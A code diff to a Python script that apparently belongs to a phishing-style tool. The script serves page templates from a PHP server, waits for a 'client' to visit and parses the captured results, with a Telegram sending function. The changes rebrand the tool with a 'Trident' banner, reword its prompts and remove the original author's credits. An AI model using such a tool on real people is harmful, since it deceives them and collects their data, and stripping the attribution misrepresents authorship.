@@ -113,25 +113,14 @@ def banner():
 		twitter_url = json_data['twitter']
 		comms_url = json_data['comms']
 
-	art = r'''
- ________  ___  ___  _______   _______   ________  _______      
-|\   ____\|\  \|\  \|\  ___ \ |\  ___ \ |\   ____\|\  ___ \     
-\ \  \___|\ \  \\\  \ \   __/|\ \   __/|\ \  \___|\ \   __/|    
- \ \  \    \ \   __  \ \  \_|/_\ \  \_|/_\ \_____  \ \  \_|/__  
-  \ \  \____\ \  \ \  \ \  \_|\ \ \  \_|\ \|____|\  \ \  \_|\ \ 
-   \ \_______\ \__\ \__\ \_______\ \_______\____\_\  \ \_______\
-    \|_______|\|__|\|__|\|_______|\|_______|\_________\|_______|
-                                           \|_________|         
-                                                                
-                                                                                                                       
-	 
-	 '''
-
-	 
+	art = r''' 
+ _____      _     _            _   
+/__   \_ __(_) __| | ___ _ __ | |_ 
+  / /\/ '__| |/ _` |/ _ \ '_ \| __|
+ / /  | |  | | (_| |  __/ | | | |_ 
+ \/   |_|  |_|\__,_|\___|_| |_|\__| '''
+	
 	utils.print(f'{G}{art}{W}\n')
-	utils.print(f'{G}[>] {C}Created By   : {W}thewhiteh4t')
-	utils.print(f'{G} |---> {C}Twitter   : {W}{twitter_url}')
-	utils.print(f'{G} |---> {C}Community : {W}{comms_url}')
 	utils.print(f'{G}[>] {C}Version      : {W}{VERSION}\n')
 
 
@@ -158,7 +147,7 @@ def send_telegram(content, msg_type):
 
 
 def template_select(site):
-	utils.print(f'{Y}[!] Select a Template :{W}\n')
+	utils.print(f'{Y}-> Select a Template <-{W}\n')
 
 	with open(TEMPLATES_JSON, 'r') as templ:
 		templ_info = templ.read()
@@ -175,25 +164,25 @@ def template_select(site):
 			if templateNum >= 0 and templateNum < len(templ_json['templates']):
 				selected = templateNum
 		else:
-			selected = int(input(f'{G}[>] {W}'))
+			selected = int(input(f'{G}---> {W}'))
 		if selected < 0:
 			print()
-			utils.print(f'{R}[-] {C}Invalid Input!{W}')
+			utils.print(f'{R}X {C}Invalid Input!{W}')
 			sys.exit()
 	except ValueError:
 		print()
-		utils.print(f'{R}[-] {C}Invalid Input!{W}')
+		utils.print(f'{R}X {C}Invalid Input!{W}')
 		sys.exit()
 
 	try:
 		site = templ_json['templates'][selected]['dir_name']
 	except IndexError:
 		print()
-		utils.print(f'{R}[-] {C}Invalid Input!{W}')
+		utils.print(f'{R}X {C}Invalid Input!{W}')
 		sys.exit()
 
 	print()
-	utils.print(f'{G}[+] {C}Loading {Y}{templ_json["templates"][selected]["name"]} {C}Template...{W}')
+	utils.print(f'{G}++++++{C}Loading {Y}{templ_json["templates"][selected]["name"]} {G}++++++{W}')
 
 	imp_file = templ_json['templates'][selected]['import_file']
 	importlib.import_module(f'template.{imp_file}')
@@ -210,8 +199,8 @@ def template_select(site):
 def server():
 	print()
 	port_free = False
-	utils.print(f'{G}[+] {C}Port : {W}{port}\n')
-	utils.print(f'{G}[+] {C}Starting PHP Server...{W}', end='')
+	utils.print(f'{G}--> {C}Port : {W}{port}\n')
+	utils.print(f'{G}--> {C}Starting PHP Server...{W}', end='')
 	cmd = ['php', '-S', f'0.0.0.0:{port}', '-t', f'template/{SITE}/']
 
 	with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
@@ -226,8 +215,8 @@ def server():
 			try:
 				old_proc = psutil.Process(pid)
 				utils.print(f'{C}[ {R}✘{C} ]{W}')
-				utils.print(f'{Y}[!] Old instance of php server found, restarting...{W}')
-				utils.print(f'{G}[+] {C}Starting PHP Server...{W}', end='')
+				utils.print(f'{Y}X Old instance of php server found, restarting...{W}')
+				utils.print(f'{G}--> {C}Starting PHP Server...{W}', end='')
 				try:
 					sleep(1)
 					if old_proc.status() != 'running':
@@ -276,7 +265,7 @@ def wait():
 		sleep(2)
 		size = path.getsize(RESULT)
 		if size == 0 and printed is False:
-			utils.print(f'{G}[+] {C}Waiting for Client...{Y}[ctrl+c to exit]{W}\n')
+			utils.print(f'{G}-->{C}Waiting for Client...{Y}[ctrl+c to exit]{W}\n')
 			printed = True
 		if size > 0:
 			data_parser()
